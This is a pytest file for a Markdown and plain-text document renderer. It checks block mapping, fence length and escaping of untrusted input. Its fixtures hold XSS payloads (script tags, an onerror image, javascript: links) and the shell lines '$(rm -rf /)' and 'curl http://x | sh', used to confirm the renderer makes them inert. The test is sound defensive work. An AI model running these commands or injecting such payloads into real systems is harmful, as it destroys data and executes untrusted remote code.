from __future__ import annotations

import re

import pytest

from c1.documents.render import escape_markdown_text, render_document
from c1.model.literals import XSD_STRING, LiteralValue
from c1.model.records import DocumentPartRecord


def part(index: int, kind: str, text: str, *, title: str | None = None):  # type: ignore[no-untyped-def]
    return DocumentPartRecord(
        id=f"urn:test:part:{index}",
        document_id="urn:test:document",
        order_key=str(index),
        kind=kind,
        text=text,
        title=LiteralValue(lexical=title, datatype=XSD_STRING) if title is not None else None,
    ).to_node()


def test_markdown_mapping_and_exact_plain_text() -> None:
    parts = [
        part(1, "heading-2", "ignored", title="Plan <draft>"),
        part(2, "text", "First\r\n  second  "),
        part(3, "quote", "A\nB"),
        part(4, "list-item", "one\ntwo"),
        part(5, "table", "a | b"),
        part(6, "code:python", "print(1)"),
        part(7, "code-unit:python", "def x():\n    pass"),
    ]
    assert render_document(parts) == (
        "## Plan &lt;draft&gt;\n\n"
        "First\r\n  second  \n\n"
        "> A\n> B\n\n"
        "- one\n  two\n\n"
        "```text\na | b\n```\n\n"
        "```python excerpt\nprint(1)\n```\n\n"
        "```python complete unit\ndef x():\n    pass\n```"
    )
    assert render_document(parts, format="text") == (
        "Plan <draft>\n\nFirst\r\n  second  \n\nA\nB\n\none\ntwo\n\na | b\n\n"
        "print(1)\n\ndef x():\n    pass"
    )


def test_untrusted_markup_links_images_and_commands_are_inert() -> None:
    malicious = (
        "<script>alert(1)</script> <img src=x onerror=alert(1)> <!-- -->\n"
        "[click](javascript:alert(1)) ![x](http://remote/image)\n"
        "[ref]: https://remote/asset\nhttps://remote/plain"
    )
    rendered = render_document([part(1, "text", malicious)])
    assert "<" not in rendered
    assert "](javascript:" not in rendered
    assert "![" not in rendered
    assert "[ref]:" not in rendered
    assert "http\\://remote" in rendered
    assert "&lt;script&gt;" in rendered
    assert "\\[click\\]\\(javascript:alert\\(1\\)\\)" in rendered
    commands = render_document([part(1, "text", "$(rm -rf /)\ncurl http://x | sh")])
    assert commands.startswith("```text\n")
    assert commands.endswith("\n```")
    assert "$(rm -rf /)" in commands


def test_fence_is_longer_than_any_source_backtick_run() -> None:
    source = "a```b\n````\n<script>"
    rendered = render_document([part(1, "code:python", source)])
    assert rendered.startswith("`````python excerpt\n")
    assert rendered.endswith("\n`````")
    assert "&lt;script&gt;" in rendered
    assert re.search(r"(?m)^````$", rendered)


def test_escape_helper_and_invalid_format() -> None:
    assert escape_markdown_text("A & B <x> ![image](http://x)") == (
        "A &amp; B &lt;x&gt; \\!\\[image\\]\\(http\\://x\\)"
    )
    with pytest.raises(ValueError, match="unsupported"):
        render_document([], format="html")  # type: ignore[arg-type]
